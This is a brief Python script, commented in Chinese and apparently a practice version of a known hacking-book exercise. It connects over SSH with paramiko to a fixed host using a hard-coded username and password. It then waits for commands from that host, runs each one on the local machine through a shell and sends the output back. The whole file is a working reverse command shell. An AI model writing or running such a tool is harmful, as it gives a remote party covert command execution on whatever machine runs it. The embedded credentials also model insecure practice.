"""
    使用SSH连接
"""

import paramiko
import subprocess


def ssh_command(ip, user, passwd, command):
    # 实例化SSHClient
    client = paramiko.SSHClient()
    # 使用秘钥认证
    # client.load_host_keys('/home/justin/.ssh/know_hosts')
    # 保存密码
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    # 连接目标服务器
    client.connect(ip, username=user, password=passwd)
    # 打开会话
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)      # 发送命令
        print(ssh_session.recv(1024).decode())       # 接收 欢迎光临

        # 正式发送/接收 消息
        while True:
            recv_command = ssh_session.recv(1024).decode()
            # print("接收到的命令：",recv_command)
            try:
                cmd_output = subprocess.check_output(recv_command, stderr=subprocess.STDOUT, shell=True)
                # print("执行命令后输出：\r\n",cmd_output.decode('gbk'))
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
                break
        client.close()
    return

ssh_command('10.10.10.61', 'zhang', 'ksbios', 'dir')